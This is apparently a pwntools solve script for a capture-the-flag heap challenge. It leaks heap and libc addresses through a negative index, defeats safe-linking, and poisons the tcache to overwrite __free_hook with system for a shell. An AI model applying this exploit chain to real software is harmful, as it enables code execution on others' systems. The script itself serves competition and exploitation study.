from pwn import *
io = process("./chall",aslr=True)
#io = remote("win.the.seetf.sg",2001)
libc = ELF("./libc.so.6")

def create(size,content):
    io.sendlineafter("5. [E]xit","C")
    io.sendlineafter("What size?",str(size))
    io.sendlineafter("What content?",content)

def output(idx,ignore=False):
    io.sendlineafter("5. [E]xit","O")
    io.sendlineafter("Which text? (0-9)",str(idx))
    io.recv()
    return io.recvuntil("1.")[:-2]

def update(idx,content):
    io.sendlineafter("5. [E]xit","U")
    io.sendlineafter("Which text? (0-9)",str(idx))
    io.sendline(content)

def delete(idx):
    io.sendlineafter("5. [E]xit","D")
    io.sendlineafter("Which text? (0-9)",str(idx))


def obfs(pos,ptr):
    return p64((pos >> 12) ^ ptr)


create(32,"abcd")
delete(0)

# deobfuscation of the obfuscated pointer (which is just null)
heapLeak = u64(output(-1)[:5].ljust(8,b"\x00"))
heapBase = (heapLeak ^ 0) << 12
log.info("HEAP BASE: " + hex(heapBase))

create(0x500,"abcd")
create(16,"abcd") # prevent consolidation, idx = 1
delete(0)

leakPos = heapBase + 0x2e0
libc.address = u64(output(-1)[:6].ljust(8,b"\x00")) - 0x219ce0 
log.info("LIBC BASE: " + hex(libc.address))

freeHook = libc.symbols["__free_hook"]
log.info("FREE HOOK: " + hex(freeHook))


# Get free chunk overwrite and do tcache bin poisoning
create(0x500,"abcd") # make things easier by clearing out all free chunks

create(48,"abcd") # 2
create(48,"abcd") # 3
create(48,"abcd") # 4

delete(4)
delete(3)
delete(2)

create(48,"/bin/sh") # 2
update(-1,obfs(heapBase+0x880,freeHook-0x18))

create(48,"abcd")
create(48,b"A" * 8 + p64(libc.symbols["system"]))

gdb.attach(io,gdbscript="x/24wx &texts")
io.interactive()

